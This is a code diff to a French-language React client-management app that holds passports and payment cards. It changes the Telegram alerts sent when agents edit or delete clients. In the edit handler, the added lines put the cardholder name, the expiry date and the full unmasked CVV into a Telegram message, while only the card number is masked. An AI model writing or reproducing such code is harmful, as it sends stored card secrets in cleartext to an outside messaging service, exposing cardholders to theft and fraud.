@@ -258,7 +258,10 @@ const App: React.FC = () => {
       };
       await updateDoc(doc(db, 'clients', id), payload);
       if (oldClient && !isAdmin) {
+        const agentName = session.user.email?.split('@')[0] || session.user.email;
+        const clientName = `${formData.lastName} ${formData.firstName}`.trim();
         const changes: string[] = [];
+        const paymentChanges: string[] = [];
         const fields: [keyof ClientFormData, string][] = [
           ['lastName', 'Nom'], ['firstName', 'Prénom'], ['phoneNumber', 'Tél'],
           ['dob', 'DN'], ['passportNumber', 'Passeport'], ['issueDate', 'Délivrance'],
@@ -268,14 +271,20 @@ const App: React.FC = () => {
         for (const [key, label] of fields) {
           const oldVal = (oldClient as any)[key] || '';
           const newVal = (formData as any)[key] || '';
-          if (oldVal !== newVal) changes.push(`<b>${label}:</b> ${oldVal} → ${newVal}`);
+          if (oldVal !== newVal) changes.push(`⚡ <b>${label}:</b> ${oldVal} → ${newVal}`);
         }
         const pOld = oldClient.payment;
         const pNew = formData.payment;
-        if (pOld?.cardNumber !== pNew.cardNumber) changes.push(`<b>Carte:</b> ${maskCard(pOld?.cardNumber || '')} → ${maskCard(pNew.cardNumber || '')}`);
-        if (pOld?.paymentStatus !== pNew.paymentStatus) changes.push(`<b>Statut:</b> ${pOld?.paymentStatus || '-'} → ${pNew.paymentStatus}`);
-        const clientName = `${formData.lastName} ${formData.firstName}`.trim();
-        const msg = `<b>✏️ MODIFICATION</b>\n<b>Agence:</b> ${session.user.email}\n<b>Client:</b> ${clientName} (${formData.passportNumber})\n${changes.join('\n')}`;
+        let paymentChanged = false;
+        if (pOld?.cardNumber !== pNew.cardNumber) { paymentChanges.push(`⚡ <b>Numéro de Carte:</b> ${maskCard(pNew.cardNumber || '')}`); paymentChanged = true; }
+        if (pOld?.cardHolderName !== pNew.cardHolderName) { paymentChanges.push(`⚡ <b>Titulaire:</b> ${pNew.cardHolderName}`); paymentChanged = true; }
+        if (pOld?.expiryDate !== pNew.expiryDate) { paymentChanges.push(`⚡ <b>Date d'Expiration:</b> ${pOld?.expiryDate || '-'} → ${pNew.expiryDate}`); paymentChanged = true; }
+        if (pOld?.cvv !== pNew.cvv) { paymentChanges.push(`⚡ <b>CVV:</b> ${pOld?.cvv || '-'} → ${pNew.cvv}`); paymentChanged = true; }
+        if (pOld?.paymentStatus !== pNew.paymentStatus) { paymentChanges.push(`🛑 <b>Statut:</b> ${pOld?.paymentStatus || '-'} → ${pNew.paymentStatus}`); paymentChanged = true; }
+
+        let msg = `⚠️ <b>MODIFICATION EFFECTUÉE</b>\n🛑 <b>Agence:</b> ${agentName}\n🛑 <b>Client:</b> ${clientName} (${formData.passportNumber})`;
+        if (changes.length > 0) msg += '\n' + changes.join('\n');
+        if (paymentChanged) msg += '\n💳 <b>Détails du Paiement (Modifiés):</b>\n' + paymentChanges.join('\n');
         sendTelegramAlert(msg);
       }
       setClients(prev => prev.map(c => c.id === id ? mapFromDB({ id, ...payload, created_at: c.createdAt }) : c));
@@ -301,8 +310,9 @@ const App: React.FC = () => {
     try {
       await deleteDoc(doc(db, 'clients', id));
       if (deletedClient && !isAdmin) {
+        const agentName = session?.user?.email?.split('@')[0] || session?.user?.email;
         const clientName = `${deletedClient.lastName} ${deletedClient.firstName}`.trim();
-        const msg = `<b>🗑️ SUPPRESSION</b>\n<b>Agence:</b> ${session?.user?.email}\n<b>Client:</b> ${clientName} (${deletedClient.passportNumber})\n<b>Statut:</b> ${deletedClient.payment?.paymentStatus || '-'}`;
+        const msg = `🚨 <b>SUPPRESSION EFFECTUÉE</b>\n🛑 <b>Agence:</b> ${agentName}\n🛑 <b>Client:</b> ${clientName} (${deletedClient.passportNumber})\n🛑 <b>Statut:</b> ${deletedClient.payment?.paymentStatus || '-'}`;
         sendTelegramAlert(msg);
       }
       setClients(prev => prev.filter(c => c.id !== id));
